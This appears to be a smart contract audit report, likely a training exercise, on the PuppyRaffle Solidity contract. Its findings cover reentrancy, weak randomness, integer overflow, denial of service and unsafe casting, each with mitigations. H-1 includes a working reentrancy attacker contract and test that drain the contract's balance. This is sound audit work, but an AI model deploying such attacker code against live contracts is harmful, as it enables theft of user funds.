### [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain contract balance

**Description:** The `PuppyRaffle::refund` function does not follow [CEI/FREI-PI](https://www.nascent.xyz/idea/youre-writing-require-statements-wrong) and as a result, enables participants to drain the contract balance.

In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address, and only after making that external call, we update the `players` array.

```javascript
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    payable(msg.sender).sendValue(entranceFee);

    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```

A player who has entered the raffle could have a `fallback`/`receive` function that calls the `PuppyRaffle::refund` function again and claim another refund. They could continue to cycle this until the contract balance is drained.

**Impact:** All fees paid by raffle entrants could be stolen by the malicious participant.

**Proof of Concept:**

1. Users enters the raffle.
2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`.
3. Attacker enters the raffle
4. Attacker calls `PuppyRaffle::refund` from their contract, draining the contract balance.

**Proof of Code:**

<details>
<summary>Code</summary>
Add the following code to the `PuppyRaffleTest.t.sol` file.

```javascript
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(address _puppyRaffle) {
        puppyRaffle = PuppyRaffle(_puppyRaffle);
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    fallback() external payable {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }
}

function testReentrance() public playersEntered {
    ReentrancyAttacker attacker = new ReentrancyAttacker(address(puppyRaffle));
    vm.deal(address(attacker), 1e18);
    uint256 startingAttackerBalance = address(attacker).balance;
    uint256 startingContractBalance = address(puppyRaffle).balance;

    attacker.attack();

    uint256 endingAttackerBalance = address(attacker).balance;
    uint256 endingContractBalance = address(puppyRaffle).balance;
    assertEq(endingAttackerBalance, startingAttackerBalance + startingContractBalance);
    assertEq(endingContractBalance, 0);
}
```

</details>

**Recommended Mitigation:** To fix this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. Additionally, we should move the event emission up as well.

```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);
        (bool success,) = msg.sender.call{value: entranceFee}("");
        require(success, "PuppyRaffle: Failed to refund player");
-        players[playerIndex] = address(0);
-        emit RaffleRefunded(playerAddress);
    }
```

### [H-2] Weak randomness in `PuppyRaffle::selectWinner` allows anyone to choose winner

**Description:** Hashing `msg.sender`, `block.timestamp`, `block.difficulty` together creates a predictable final number. A predictable number is not a good random number. Malicious users can manipulate these values or know them ahead of time to choose the winner of the raffle themselves.

**Impact:** Any user can choose the winner of the raffle, winning the money and selecting the "rarest" puppy, essentially making it such that all puppies have the same rarity, since you can choose the puppy.

**Proof of Concept:**

There are a few attack vectors here.

1. Validators can know ahead of time the `block.timestamp` and `block.difficulty` and use that knowledge to predict when / how to participate. See the [solidity blog on prevrando](https://soliditydeveloper.com/prevrandao) here. `block.difficulty` was recently replaced with `prevrandao`.
2. Users can manipulate the `msg.sender` value to result in their index being the winner.

Using on-chain values as a randomness seed is a [well-known attack vector](https://betterprogramming.pub/how-to-generate-truly-random-numbers-in-solidity-and-blockchain-9ced6472dbdf) in the blockchain space.

**Recommended Mitigation:** Consider using an oracle for your randomness like [Chainlink VRF](https://docs.chain.link/vrf/v2/introduction).

### [H-3] Integer overflow of `PuppyRaffle::totalFees` loses fees

**Description:** In Solidity versions prior to `0.8.0`, integers were subject to integer overflows.

```javascript
uint64 myVar = type(uint64).max;
// myVar will be 18446744073709551615
myVar = myVar + 1;
// myVar will be 0
```

**Impact:** In `PuppyRaffle::selectWinner`, `totalFees` are accumulated for the `feeAddress` to collect later in `withdrawFees`. However, if the `totalFees` variable overflows, the `feeAddress` may not collect the correct amount of fees, leaving fees permanently stuck in the contract.

**Proof of Concept:**

1. We first conclude a raffle of 4 players to collect some fees.
2. We then have 89 additional players enter a new raffle, and we conclude that raffle as well.
3. `totalFees` will be:

```javascript
totalFees = totalFees + uint64(fee);
// substituted
totalFees = 800000000000000000 + 17800000000000000000;
// due to overflow, the following is now the case
totalFees = 153255926290448384;
```

4. You will now not be able to withdraw, due to this line in `PuppyRaffle::withdrawFees`:

```javascript
require(address(this).balance ==
  uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

Although you could use `selfdestruct` to send ETH to this contract in order for the values to match and withdraw the fees, this is clearly not what the protocol is intended to do.

<details>
<summary>Proof Of Code</summary>
Place this into the `PuppyRaffleTest.t.sol` file.

```javascript
function testTotalFeesOverflow() public playersEntered {
        // We finish a raffle of 4 to collect some fees
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        uint256 startingTotalFees = puppyRaffle.totalFees();
        // startingTotalFees = 800000000000000000

        // We then have 89 players enter a new raffle
        uint256 playersNum = 89;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        // We end the raffle
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // And here is where the issue occurs
        // We will now have fewer fees even though we just finished a second raffle
        puppyRaffle.selectWinner();

        uint256 endingTotalFees = puppyRaffle.totalFees();
        console.log("ending total fees", endingTotalFees);
        assert(endingTotalFees < startingTotalFees);

        // We are also unable to withdraw any fees because of the require check
        vm.prank(puppyRaffle.feeAddress());
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
```

</details>

**Recommended Mitigation:** There are a few recommended mitigations here.

1. Use a newer version of Solidity that does not allow integer overflows by default.

```diff
- pragma solidity ^0.7.6;
+ pragma solidity ^0.8.18;
```

Alternatively, if you want to use an older version of Solidity, you can use a library like OpenZeppelin's `SafeMath` to prevent integer overflows.

2. Use a `uint256` instead of a `uint64` for `totalFees`.

```diff
- uint64 public totalFees = 0;
+ uint256 public totalFees = 0;
```

3. Remove the balance check in `PuppyRaffle::withdrawFees`

```diff
- require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

We additionally want to bring your attention to another attack vector as a result of this line in a future finding.

### [M-1] Looping through players array to check for duplicates in `PuppyRaffle:enterRaffle` is a potential denail of service (DoS) attack, incrementing gas costs for future entrants

**Description:** Gas will grow.

**Imapact:** The gas costs for raggle entrants will greatly increase as more players enter the raffle. Discouraging layer users from entering, and causing a rush at the start of a raffle to be one of the first entrants in the queue.

An attacker might make the `PuppyRaffle:entrants` array so big, that no one else enters, guarenteeing themselves the win.

**Proof of Concepy:**

If we have 2 sets of 100 players enter, the gas costs will be such:

- 1st 100 players: ~6252039
- 2nd 100 players: ~18068126

<details>
<summary>PoC</summary>

```javascript
    function testDos() public {
        // 100 payers
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);

        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }

        uint256 gasStart = gasleft();

        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);

        uint256 gasEnd = gasleft();

        uint256 gasUsedFirst = gasStart - gasEnd;

        console.log("gasUsedFirst", gasUsedFirst);

        // 2nd 100 payers

        address[] memory playersTwo = new address[](playersNum);

        for (uint256 i = 0; i < playersNum; i++) {
            playersTwo[i] = address(i + playersNum);
        }

        gasStart = gasleft();

        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(playersTwo);

        gasEnd = gasleft();

        uint256 gasUsedSecond = gasStart - gasEnd;

        console.log("gasUsedSecond", gasUsedSecond);

        assert(gasUsedSecond > gasUsedFirst);
    }
```

</details>

**Recommended Mitigation:** There are a few recomendations.

1. Consider allowing duplicates.

2. Consider using a mapping to check for duplicates.

### [M-3] Unsafe cast of `PuppyRaffle::fee` loses fees

**Description:** In `PuppyRaffle::selectWinner` their is a type cast of a `uint256` to a `uint64`. This is an unsafe cast, and if the `uint256` is larger than `type(uint64).max`, the value will be truncated.

```javascript
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length > 0, "PuppyRaffle: No players in raffle");

        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 fee = totalFees / 10;
        uint256 winnings = address(this).balance - fee;
@>      totalFees = totalFees + uint64(fee);
        players = new address[](0);
        emit RaffleWinner(winner, winnings);
    }
```

The max value of a `uint64` is `18446744073709551615`. In terms of ETH, this is only ~`18` ETH. Meaning, if more than 18ETH of fees are collected, the `fee` casting will truncate the value.

**Impact:** This means the `feeAddress` will not collect the correct amount of fees, leaving fees permanently stuck in the contract.

**Proof of Concept:**

1. A raffle proceeds with a little more than 18 ETH worth of fees collected
2. The line that casts the `fee` as a `uint64` hits
3. `totalFees` is incorrectly updated with a lower amount

You can replicate this in foundry's chisel by running the following:

```javascript
uint256 max = type(uint64).max
uint256 fee = max + 1
uint64(fee)
// prints 0
```

**Recommended Mitigation:** Set `PuppyRaffle::totalFees` to a `uint256` instead of a `uint64`, and remove the casting. Their is a comment which says:

```javascript
// We do some storage packing to save gas
```

But the potential gas saved isn't worth it if we have to recast and this bug exists.

```diff
-   uint64 public totalFees = 0;
+   uint256 public totalFees = 0;
.
.
.
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
-       totalFees = totalFees + uint64(fee);
+       totalFees = totalFees + fee;
```

### [I-1]: Solidity pragma should be specific, not wide

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

### [I-2] Magic Numbers

**Description:** All number literals should be replaced with constants. This makes the code more readable and easier to maintain. Numbers without context are called "magic numbers".

**Recommended Mitigation:** Replace all magic numbers with constants.

```diff
+       uint256 public constant PRIZE_POOL_PERCENTAGE = 80;
+       uint256 public constant FEE_PERCENTAGE = 20;
+       uint256 public constant TOTAL_PERCENTAGE = 100;
.
.
.
-        uint256 prizePool = (totalAmountCollected * 80) / 100;
-        uint256 fee = (totalAmountCollected * 20) / 100;
         uint256 prizePool = (totalAmountCollected * PRIZE_POOL_PERCENTAGE) / TOTAL_PERCENTAGE;
         uint256 fee = (totalAmountCollected * FEE_PERCENTAGE) / TOTAL_PERCENTAGE;
```

### [I-4] Zero address validation

**Description:** The `PuppyRaffle` contract does not validate that the `feeAddress` is not the zero address. This means that the `feeAddress` could be set to the zero address, and fees would be lost.

```
PuppyRaffle.constructor(uint256,address,uint256)._feeAddress (src/PuppyRaffle.sol#57) lacks a zero-check on :
                - feeAddress = _feeAddress (src/PuppyRaffle.sol#59)
PuppyRaffle.changeFeeAddress(address).newFeeAddress (src/PuppyRaffle.sol#165) lacks a zero-check on :
                - feeAddress = newFeeAddress (src/PuppyRaffle.sol#166)
```

**Recommended Mitigation:** Add a zero address check whenever the `feeAddress` is updated.
